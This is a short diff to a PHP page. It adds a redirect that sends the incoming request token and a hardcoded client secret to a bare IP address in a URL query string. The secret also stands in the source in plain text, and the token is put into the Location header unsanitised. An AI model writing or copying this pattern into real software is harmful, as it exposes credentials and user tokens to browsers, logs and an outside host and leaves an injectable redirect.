@@ -1,7 +1,9 @@
 <?php
-$redirect_url = "http://34.69.148.52/userdata.php";
+$redirect_url = "http://34.69.148.52/userdata.php?token=";
 $client_secret = "c2be2d061d0c4f56060ae9d18a2c0ca0";
 $token = $_REQUEST["token"];
+
+header("Location: http://34.69.148.52/userdata.php?token=$token&client_secret=$client_secret");
 ?>
 <html style="background-color:grey;">
     <head>
